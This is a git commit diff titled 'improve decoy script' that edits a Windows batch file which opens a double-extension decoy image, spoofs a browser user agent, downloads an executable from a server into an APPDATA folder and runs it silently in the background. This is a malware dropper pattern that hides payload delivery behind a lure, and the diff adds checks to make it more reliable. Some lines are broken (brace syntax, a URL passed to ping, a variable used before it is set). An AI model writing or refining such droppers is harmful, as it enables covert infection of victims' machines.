586ce76f233664ede0d809b4a8a513bef9c8b59a
Ian G <49762827+the-wandering-photon@users.noreply.github.com>
2023-12-24 11:46:12 +0000

    improve decoy script

--- decoy/nested/script.bat
+++ decoy/nested/script.bat
@@ -4,15 +4,31 @@ setlocal
 :: open the decoy
 start "" "./bird2.jpg.png"
 
+:: ping the host to see if its up, if not exit.
+ping -n 1 http://localhost/ > nul
+if %errorlevel% neq 0 {
+    exit /b
+}
+
 :: useragent
 set UserAgent=Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+
+:: download the file to APPDATA
+curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php
+
+:: check if error connecting
+if %errorlevel% neq 0 {
+    exit /b
+}
 
 :: create folder in APPDATA
 set ZestyChipsFolder=%APPDATA%\ZestyChips
 mkdir "%ZestyChipsFolder%"
 
-:: download the file to APPDATA
-curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php
+:: check file exists (i.e. successful download) if not exit
+if not exist "%ZestyChipsFolder%\ZestyChipsFromURL.exe" {
+    exit /b
+}
 
 :: execute in background
 start /b "" "%ZestyChipsFolder%\ZestyChipsFromURL.exe"
